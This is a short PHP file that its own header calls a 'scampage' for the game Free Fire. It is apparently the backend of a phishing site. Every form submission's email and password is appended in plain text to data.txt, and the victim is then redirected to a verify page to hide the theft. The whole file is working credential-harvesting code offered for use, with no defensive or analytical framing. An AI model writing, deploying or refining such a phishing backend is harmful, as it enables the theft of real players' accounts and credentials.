<?php
// <!-- Author   : msversee -->
// <!-- Name     : script scampage free fire -->
// <!-- version  : 1.0.0 -->
// <!-- Homepage : https://msversee.blogspot.com -->
// <!-- Massage  : If there are any bugs or other issues, please fix them yourself. Don't be spoiled. -->

// Redirect after form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    $data = "Email: " . $email . "\nPassword: " . $password . "\n\nCopyright by msversee";

    // Open or create data.txt file
    $file = fopen("data.txt", "a");

    // Write email and password data to the file
    fwrite($file, $data);

    // Close the file
    fclose($file);

    // Redirect to verify.php after data is saved
    header("Location: verify.php");
    exit;
}

// Redirect immediately when the file is accessed directly (without POST request)
header("Location: verify.php");
exit;
?>
